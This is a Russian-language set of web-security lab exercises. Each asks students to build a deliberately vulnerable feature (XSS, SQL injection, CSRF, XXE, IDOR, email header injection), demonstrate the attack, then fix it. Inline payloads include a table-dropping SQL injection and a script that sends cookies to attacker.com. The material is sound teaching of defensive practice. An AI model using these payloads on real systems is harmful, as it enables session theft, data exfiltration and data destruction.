5=12
1. Создайте веб-страницу с формой регистрации (поля: имя пользователя, email, пароль), отправляющей данные на сервер, где данные сохраняются в базе данных. Убедитесь, что на сервере нет валидации данных, и попробуйте ввести вредоносный скрипт), чтобы продемонстрировать XSS-уязвимость. Затем исправьте уязвимость, реализовав серверную валидацию данных, экранирование HTML-символов.
2.Реализуйте форму авторизации (email и пароль), которая отправляет данные на сервер. На сервере создайте уязвимый SQL-запрос, например: SELECT * FROM users WHERE email = '$email' AND password = '$password'. Попробуйте выполнить SQL-инъекцию, введя в поле email: ' OR '1'='1. Затем исправьте уязвимость.
3.Создайте страницу с формой добавления комментариев, которые сохраняются в базе данных и отображаются на странице. Введите в поле комментария вредоносный код и убедитесь, что он срабатывает. После этого защитите приложение, экранируя специальные символы
4.Реализуйте API для управления пользователями с использованием ORM. Создайте модель User с полями id, name, email, password. Реализуйте маршруты для создания и получения пользователей. 
5.Создайте форму для изменения email-адреса пользователя, которая отправляет POST-запрос на сервер. Смоделируйте CSRF-атаку, создав внешнюю страницу, которая автоматически отправляет запрос на ваш сервер от имени пользователя. Затем защитите приложение.
6.Создайте REST API для управления пользователями с маршрутами GET /users (получение списка), POST /users (создание пользователя) и DELETE /users/:id (удаление пользователя). На клиентской стороне реализуйте форму для добавления пользователя и таблицу для отображения списка пользователей. Формы должны быть защищены
7.Создайте форму регистрации, в которой пароли пользователей шифруются перед сохранением в базу данных. Для сравнения реализуйте хеширование паролей с использованием bcrypt и объясните разницу между шифрованием и хешированием, а также преимущества использования хеширования для хранения паролей.
8.Реализуйте регистрацию и авторизацию пользователей, при этом пароли должны хешироваться с использованием bcrypt перед сохранением в базу данных. При авторизации сравнивайте введённый пароль с хешем, хранящимся в базе данных, для проверки подлинности пользователя.
9.Создайте простую страницу поиска пользователей по ID (поле ввода id и кнопка "Найти"). Серверное приложение должно формировать SQL-запрос по шаблону "SELECT * FROM users WHERE id = " + input_id и возвращать результат. Продемонстрируйте, как можно получить данные всех пользователей или выполнить несанкционированные операции, введя 1 OR 1=1 или 1; DROP TABLE users;. Затем исправьте уязвимость, перейдя на использование параметризованных запросов (prepared statements).
10.Создайте механизм "запомнить меня" с использованием куки. При установке флажка сервер сериализует объект пользователя (с полями id, username, isAdmin) в строку, хеширует её и отправляет как куки. Покажите, как злоумышленник, имея доступ к хешу, может подменить isAdmin на true, если используется простая конкатенация и слабый алгоритм хеширования (например, MD5). Затем исправьте уязвимость, используя цифровую подпись с секретным ключом и устойчивым алгоритмом (например, HMAC-SHA256).
11.Проектируйте базу данных с таблицами users и orders, где один пользователь может иметь несколько заказов (отношение «один ко многим»), добавьте ограничения целостности данных и реализуйте API для работы с этими данными.
12.Создайте функционал смены email авторизованного пользователя через POST-запрос на /update-email. Покажите, как злоумышленник может разместить на другом сайте скрытую форму или сгенерировать запрос, который автоматически отправится от имени жертвы, если та зайдет на вредоносную страницу. Затем защитите приложение, добавив CSRF-токен в форму и проверяя его на сервере.
13.Создайте страницу входа с полями логин и пароль. Продемонстрируйте, как можно автоматизированно отправлять POST-запросы с разными паролями для одного пользователя (например, с помощью скрипта). Реализуйте базовую защиту: вводите задержку ответа в 2 секуни после неудачной попытки, а затем более продвинутую — блокировку IP-адреса или учетной записи после N неудачных попыток в течение определенного времени.
14.Создайте форму для загрузки аватарки пользователя (файл изображения). Покажите, как злоумышленник может загрузить файл с расширением .js или .html, содержащий вредоносный код, который выполнится при обращении к нему. Затем реализуйте защиту: проверку типа файла по его сигнатуре (MIME-типу), а не по расширению, переименование файлов и хранение их вне корневой веб-директории.
15.Настройте серверное приложение так, чтобы при обработке некорректного запроса к несуществующему ID в БД (/user/99999) оно возвращало подробное сообщение об ошибке, включающее стек-трейс, версии используемых технологий (например, TypeError: Cannot read property 'name' of null at /app/routes/users.js:25). Продемонстрируйте, как эта информация помогает атакующему. Затем исправьте, заменив детальные ошибки на общие сообщения для пользователя, а детали логируя только на сервере.
16.Создайте систему документов, где каждый пользователь может просматривать свои файлы по ID (/documents/123). ID документа хранится в БД без проверки прав доступа текущего пользователя к этому документу. Покажите, как пользователь может получить доступ к чужим документам, просто изменяя ID в URL. Затем исправьте уязвимость, добавив проверку авторизации при каждом запросе к ресурсу.
17.Реализуйте механизм сессий с использованием express-session: после авторизации создайте сессию для пользователя, храните данные о сессии на сервере и используйте их для проверки авторизации на защищённых маршрутах.
18.Создайте форму "Отправить другу" (например, ссылку на статью), где пользователь вводит свой email, email друга и сообщение. Сервер формирует и отправляет email, подставляя введенные данные в заголовки To: и Subject:. Покажите, как можно внедрить дополнительные заголовки или получателей, введя в поле "Email друга" значение: friend@example.com\nBcc: hacker@evil.com. Затем исправьте уязвимость, валидируя email-адреса и экранируя спецсимволы (или используя библиотеки для работы с email).
19.Создайте форму, принимающую XML-документ для обработки (например, импорт данных). Серверный парсер настроен на обработку внешних сущностей. Покажите, как можно передать XML, который заставит сервер:
- Вывести содержимое системного файла (/etc/passwd)
- Отправить данные на внешний сервер злоумышленника
- Затем исправьте уязвимость, отключив обработку внешних сущностей в настройках XML-парсера.
20.Создайте интернет-магазин с корзиной. Цена товара передается с клиента на сервер при добавлении в заказ. Покажите, как можно изменить цену в POST-запросе (черед DevTools или curl), установив отрицательное значение или 0. Затем исправьте уязвимость, перестав доверять данным с клиента и вычисляя цену на сервере на основе ID товара из БД.
21.Создайте страницу поиска, где введенный запрос отображается на странице результатов без экранирования: "Результаты по запросу: <пользовательский_ввод>". Покажите, как можно создать ссылку /search?q=<script>alert(document.cookie)</script> и отправить её жертве. Затем реализуйте защиту через экранирование HTML-сущностей на стороне сервера или клиента.
22.Создайте страницу редактирования профиля с полем "О себе", которое сохраняется в БД и отображается на публичной странице профиля. Введите <img src=x onerror=alert('XSS')> в это поле. Покажите, как скрипт выполняется у каждого, кто просматривает профиль. Затем исправьте, экранируя вывод на стороне сервера.
23.Создайте одностраничное приложение (SPA), которое получает данные от API и отображает их через element.innerHTML = apiData. Сымитируйте вредоносный ответ API: {"content": "<img src=x onerror='stealCookies()'>"}. Покажите выполнение скрипта. Затем исправьте, используя textContent или безопасные методы DOM-манипуляции.
24.Разработайте форму предварительного просмотра аватара, где введенный URL отображается: <img src="<пользовательский_ввод>" class="avatar">. Покажите, как ввод " onload="alert('XSS') приводит к выполнению кода. Исправьте, экранируя кавычки и другие спецсимволы в атрибутах.
25.Приложение отображает содержимое заголовка Referer на странице: "Вы пришли с: <Referer>". Покажите, как можно отправить запрос с заголовком Referer: <script>alert(1)</script> и выполнить XSS. Исправьте, экранируя все данные из заголовков HTTP.
26.Создайте форму "Обратной связи", которая сохраняет сообщения в админ-панели, доступной только администраторам. Сообщения отображаются без экранирования. Покажите, как можно отправить сообщение с полезной нагрузкой <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>, которая сработает, когда администратор просмотрит сообщение. Исправьте, экранируя вывод во всех интерфейсах.
